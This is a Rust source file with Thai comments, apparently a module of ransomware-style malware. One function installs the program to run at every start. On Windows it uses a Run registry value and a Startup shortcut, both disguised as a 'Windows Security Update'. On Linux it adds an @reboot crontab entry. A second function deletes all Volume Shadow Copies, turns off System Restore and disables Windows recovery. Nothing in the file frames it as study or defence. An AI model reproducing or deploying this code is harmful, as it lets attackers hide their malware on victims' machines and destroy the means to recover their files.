#[cfg(windows)]
use winreg::enums::*;
#[cfg(windows)]
use winreg::RegKey;

use std::process::Command;

pub fn add_persistence() {
    #[cfg(windows)]
    {
        let exe_path = std::env::current_exe().unwrap();
        let exe_str = exe_path.to_str().unwrap();

        // เพิ่มใน Run registry
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        let (key, _) = hkcu.create_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            .expect("Failed to create registry key");

        key.set_value("Windows Security Update", &exe_str)
            .expect("Failed to set registry value");

        // เพิ่มใน Startup folder ด้วย (double persistence)
        let startup_path = std::env::var("APPDATA")
            .map(|p| std::path::PathBuf::from(p).join("Microsoft\\Windows\\Start Menu\\Programs\\Startup"))
            .unwrap();

        let link_path = startup_path.join("SecurityUpdate.lnk");
        // สร้าง shortcut (ใช้ PowerShell)
        let ps_script = format!(
            r#"$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut("{}"); $Shortcut.TargetPath = "{}"; $Shortcut.Save"#,
            link_path.to_str().unwrap().replace("\\", "\\\\"),
            exe_str.replace("\\", "\\\\")
        );

        let _ = Command::new("powershell")
            .arg("-Command")
            .arg(&ps_script)
            .output();
    }

    #[cfg(not(windows))]
    {
        // สำหรับ Linux - เพิ่มใน crontab @reboot
        let exe_path = std::env::current_exe().unwrap();
        let _ = Command::new("sh")
            .arg("-c")
            .arg(format!("(crontab -l 2>/dev/null; echo \"@reboot {}\" ) | crontab -", exe_path.display()))
            .output();
    }
}

pub fn disable_recovery() {
    #[cfg(windows)]
    {
        // ลบ Volume Shadow Copies
        let _ = Command::new("cmd")
            .args(&["/C", "vssadmin delete shadows /all /quiet"])
            .output();

        // ปิด System Restore
        let _ = Command::new("cmd")
            .args(&["/C", "powershell Disable-ComputerRestore -Drive C:\\"])
            .output();

        // ปิด Windows Recovery Environment
        let _ = Command::new("cmd")
            .args(&["/C", "reagentc /disable"])
            .output();
    }
}